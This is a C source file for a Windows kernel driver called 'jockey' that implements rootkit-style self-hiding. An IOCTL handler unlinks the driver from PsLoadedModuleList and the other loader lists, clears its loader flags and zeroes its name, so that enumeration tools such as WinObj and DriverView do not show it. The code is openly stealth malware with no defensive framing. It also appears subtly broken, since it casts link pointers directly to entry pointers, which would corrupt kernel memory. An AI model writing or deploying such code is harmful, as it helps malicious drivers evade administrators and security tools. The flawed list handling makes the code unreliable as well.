#include "jockey_common.h"

/*
 * jockey_driverhide.c ??? Driver self-hide and stealth.
 *
 * Unlinks driver from PsLoadedModuleList so it doesn't show up
 * in driver enumeration tools (WinObj, poolmon, DriverView, etc.).
 */

#include "jockey.h"

static DRIVER_OBJECT *g_driver_obj = NULL;

void jockey_set_driver_object(PDRIVER_OBJECT obj)
{
    g_driver_obj = obj;
}

/*
 * jockey_ioctl_hide_driver:
 *   Unlinks driver from PsLoadedModuleList.
 *   Clears DriverSection flags.
 *   Zeroes driver name buffer.
 */
NTSTATUS jockey_ioctl_hide_driver(PIRP irp, ULONG in_len, ULONG out_len)
{
    PJOCKEY_LDR_DATA_TABLE_ENTRY entry, prev, next;
    uint32_t *out;

    UNREFERENCED_PARAMETER(in_len);
    UNREFERENCED_PARAMETER(out_len);

    if (!g_driver_obj || !g_driver_obj->DriverSection)
        return STATUS_NOT_SUPPORTED;

    entry = (PJOCKEY_LDR_DATA_TABLE_ENTRY)g_driver_obj->DriverSection;

    /* Unlink from InLoadOrderModuleList (PsLoadedModuleList) */
    prev = entry->InLoadOrderLinks.Blink;
    next = entry->InLoadOrderLinks.Flink;
    prev->InLoadOrderLinks.Flink = next;
    next->InLoadOrderLinks.Blink = prev;

    /* Unlink from InMemoryOrderModuleList */
    prev = (PJOCKEY_LDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Blink;
    next = (PJOCKEY_LDR_DATA_TABLE_ENTRY)entry->InMemoryOrderLinks.Flink;
    prev->InMemoryOrderLinks.Flink = entry->InMemoryOrderLinks.Flink;
    next->InMemoryOrderLinks.Blink = entry->InMemoryOrderLinks.Blink;

    /* Unlink from InInitializationOrderModuleList */
    prev = (PJOCKEY_LDR_DATA_TABLE_ENTRY)entry->InInitializationOrderLinks.Blink;
    next = (PJOCKEY_LDR_DATA_TABLE_ENTRY)entry->InInitializationOrderLinks.Flink;
    prev->InInitializationOrderLinks.Flink = entry->InInitializationOrderLinks.Flink;
    next->InInitializationOrderLinks.Blink = entry->InInitializationOrderLinks.Blink;

    /* Clear flags to mark as unloaded */
    entry->Flags &= ~LDRP_LOAD_IN_PROGRESS;
    entry->Flags &= ~LDRP_ENTRY_PROCESSED;
    entry->Flags &= ~LDRP_PROCESS_ATTACH_CALLED;

    /* Zero the driver name */
    if (entry->BaseDllName.Buffer) {
        RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length = 0;
        entry->BaseDllName.MaximumLength = 0;
    }
    if (entry->FullDllName.Buffer) {
        RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length = 0;
        entry->FullDllName.MaximumLength = 0;
    }

    DbgPrint("[jockey] Driver hidden from PsLoadedModuleList\n");

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}



